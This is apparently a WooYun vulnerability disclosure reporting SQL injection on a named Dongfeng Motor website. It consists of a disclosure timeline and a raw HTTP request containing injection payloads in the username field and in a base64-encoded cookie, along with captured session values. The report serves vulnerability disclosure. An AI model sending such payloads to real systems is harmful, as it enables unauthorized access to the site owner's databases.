wybug_title: 东风汽车集团某站存在SQL注入
wybug_detail:
漏洞详情 披露状态：   									2015-10-13：	细节已通知厂商并且等待厂商处理中									2015-10-13：	厂商已经确认，细节仅向厂商公开									2015-10-23：	细节向核心白帽子及相关领域专家公开									2015-11-02：	细节向普通白帽子公开									2015-11-12：	细节向实习白帽子公开									2015-11-27：	细节向公众公开  简要描述： 涉及8个库。 详细说明：  1、注入点：
POST /fs/pressroom_reg_ok/1444448866.html HTTP/1.1Cache-Control: no-cacheReferer: http://www.dfpv.com.cn/fs/pressroom_reg.htmlAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36Accept-Language: en-us,en;q=0.5Host: www.dfpv.com.cnCookie: ci_session=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%2242408c40bb80b9379bbfef569bbdab72%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A12%3A%2214.23.175.62%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A50%3A%22Mozilla%2F5.0+%28Windows+NT+6.3%3B+WOW64%29+AppleWebKit%2F53%22%3Bs%3A13%3A%22last_activity%22%3Bs%3A10%3A%221444453160%22%3B%7Ddc0d9a342c83b826c5bbbfe4fc5b34ea; return_url=http%3A%2F%2Fwww.dfpv.com.cn%2Fnews.html%3Fam%3Dsearch%26key%3D%26page%3D%24page; province=2; PHPSESSID=9muroq6pl2nfe4ilki82ds7rr0; city=.html.nsx; auther=eyJyZWFsbmFtZSI6ImNhc3QoKHNlbGVjdCBjaHIoOTUpfHxjaHIoMzMpfHxjaHIoNjQpfHxjaHIoNTMpfHxjaHIoMTAwKXx8Y2hyKDEwNSl8fGNocigxMDgpfHxjaHIoMTAxKXx8Y2hyKDEwOSl8fGNocigxMDkpfHxjaHIoOTcpKSBhcyBudW1lcmljKSIsInBhc3MiOiIzIiwiZGF0ZWxpbmUiOjE0NDQ0NTMxNjF9Accept-Encoding: gzip, deflateProxy-Connection: Keep-AliveContent-Length: 94Content-Type: application/x-www-form-urlencodedusername=-1+OR+17-7%3d10&email=netsparker%40example.com&pwd=3&pwd2=3&media_name=Smith&mobile=3
